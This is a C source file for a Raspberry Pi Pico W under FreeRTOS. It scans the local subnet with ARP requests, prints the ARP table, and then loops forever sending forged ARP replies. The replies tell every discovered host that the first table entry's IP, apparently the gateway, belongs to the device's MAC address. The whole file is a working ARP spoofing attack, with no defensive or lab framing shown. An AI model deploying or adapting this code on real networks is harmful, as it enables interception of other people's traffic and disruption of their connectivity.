// TH
#include <stdio.h>
#include "pico/cyw43_arch.h"
#include "pico/stdlib.h"
#include "FreeRTOS.h"
#include "task.h"
#include "ping.h"
#include "hardware/gpio.h"
#include "lwip/inet.h" 
#include "lwip/ip4_addr.h"
#include "lwip/ethip6.h"
#include "lwip/etharp.h"
#include "lwip/raw.h"

// Define the Ethernet ethertype for ARP
#define ARP_PROTOCOL 0x0806

#ifndef PING_ADDR
#define PING_ADDR "192.168.19.240"
#endif

#ifndef RUN_FREERTOS_ON_CORE
#define RUN_FREERTOS_ON_CORE 0
#endif

#define TEST_TASK_PRIORITY (tskIDLE_PRIORITY + 1UL)

/* Parameters:
* netif – the lwip network interface on which to send the ARP packet
* ethsrc_addr – the source MAC address for the ethernet header
* ethdst_addr – the destination MAC address for the ethernet header
* hwsrc_addr – the source MAC address for the ARP protocol header
* ipsrc_addr – the source IP address for the ARP protocol header
* hwdst_addr – the destination MAC address for the ARP protocol header
* ipdst_addr – the destination IP address for the ARP protocol header
*/
void send_arp_reply(struct netif *netif, const struct eth_addr *ethsrc_addr,
                    const struct eth_addr *ethdst_addr, const struct eth_addr *hwsrc_addr,
                    const ip4_addr_t *ipsrc_addr, const struct eth_addr *hwdst_addr,
                    const ip4_addr_t *ipdst_addr) 
{
    err_t err = etharp_reply(netif, ethsrc_addr, ethdst_addr, hwsrc_addr, ipsrc_addr, hwdst_addr, ipdst_addr);
    if (err != ERR_OK) 
    {
        printf("Failed to send ARP reply.\n");
    }
}

void main_task(__unused void *params) 
{
    if (cyw43_arch_init()) 
    {
        printf("** Failed to initialize **\n");
        return;
    }
    cyw43_arch_enable_sta_mode();
    printf("Connecting to Wi-Fi...\n");

    while (cyw43_arch_wifi_connect_timeout_ms(WIFI_SSID, WIFI_PASSWORD, CYW43_AUTH_WPA2_AES_PSK, 15000)) 
    {
        // Failed to connect, retry after a delay
        printf("Failed to connect. Retrying in 15 seconds...\n");
        vTaskDelay(15000 / portTICK_PERIOD_MS);
    }

    printf("Connected.\n");

    // Get the device's IP address
    struct netif* netif = &cyw43_state.netif[0];
    ip_addr_t ip = netif->ip_addr;

    // Set device_mac using the MAC address of the netif
    struct eth_addr device_mac;
    SMEMCPY(&device_mac, netif->hwaddr, ETH_HWADDR_LEN);

    // Get the first three octets from the device's IP address
    uint8_t octet1 = ip4_addr1_16(&ip);
    uint8_t octet2 = ip4_addr2_16(&ip);
    uint8_t octet3 = ip4_addr3_16(&ip);

    printf("\nDevice IP: %u.%u.%u.%u\n", octet1, octet2, octet3, ip4_addr4_16(&ip));
    printf("Device MAC: %02X:%02X:%02X:%02X:%02X:%02X\n\n", device_mac.addr[0], device_mac.addr[1], 
    device_mac.addr[2], device_mac.addr[3], device_mac.addr[4], device_mac.addr[5]);    
    
    printf("Scanning the network...\n");
    for (int i = 0; i <=255; i++) 
    {
        ip_addr_t target_ip;
        uint8_t octet4 = i & 0xFF;
        IP4_ADDR(ip_2_ip4(&target_ip), octet1, octet2, octet3, octet4);

        // Preparing the ARP request
        etharp_request(&cyw43_state.netif[0], &target_ip);

        // Delay a bit, 25 seems fine
        vTaskDelay(25 / portTICK_PERIOD_MS);
    }
    size_t entry_index;
    ip4_addr_t *ipaddr;
    ip4_addr_t *spoof_ipaddr;
    struct eth_addr *ethaddr;

    // Prints out all ARP table entries
    for (entry_index = 0; entry_index < ARP_TABLE_SIZE; entry_index++) 
    {
        if (etharp_get_entry(entry_index, &ipaddr, &netif, &ethaddr)) 
        {
            // Print or use the information from the ARP table entry
            printf("Entry %d: IP Address: %s, Interface: %s, MAC Address: %02X:%02X:%02X:%02X:%02X:%02X\n",
                entry_index, ip4addr_ntoa(ipaddr), netif->name, ethaddr->addr[0], ethaddr->addr[1],
                ethaddr->addr[2], ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]);
        }
    }   
    if (etharp_get_entry(0, &ipaddr, &netif, &ethaddr)) 
    {
        spoof_ipaddr = ipaddr;
    }

    printf("Sending Spoof...");
    while (true) 
    {
        for (entry_index = 0; entry_index < ARP_TABLE_SIZE; entry_index++)
        {
            if (etharp_get_entry(entry_index, &ipaddr, &netif, &ethaddr)) 
            {
                send_arp_reply(&cyw43_state.netif[0], &device_mac, ethaddr, &device_mac, spoof_ipaddr, &device_mac, &ip);
            }
        }
        vTaskDelay(2000); // Delay before sending the next message
    }
    cyw43_arch_deinit();
}

void vLaunch( void) {
    TaskHandle_t task;
    xTaskCreate(main_task, "TestMainThread", configMINIMAL_STACK_SIZE, NULL, TEST_TASK_PRIORITY, &task);

#if NO_SYS && configUSE_CORE_AFFINITY && configNUM_CORES > 1
    // we must bind the main task to one core (well at least while the init is called)
    // (note we only do this in NO_SYS mode because cyw43_arch_freertos
    // takes care of it otherwise)
    vTaskCoreAffinitySet(task, 1);
#endif

    /* Start the tasks and timer running. */
    vTaskStartScheduler();
}

int main( void )
{
    stdio_init_all();

    /* Configure the hardware ready to run the demo. */
    const char *rtos_name;
#if ( portSUPPORT_SMP == 1 )
    rtos_name = "FreeRTOS SMP";
#else
    rtos_name = "FreeRTOS";
#endif

#if ( portSUPPORT_SMP == 1 ) && ( configNUM_CORES == 2 )
    printf("Starting %s on both cores:\n", rtos_name);
    vLaunch();
#elif ( RUN_FREERTOS_ON_CORE == 1 )
    printf("Starting %s on core 1:\n", rtos_name);
    multicore_launch_core1(vLaunch);
    while (true);
#else
    printf("Starting %s on core 0:\n", rtos_name);
    vLaunch();
#endif
    return 0;
}
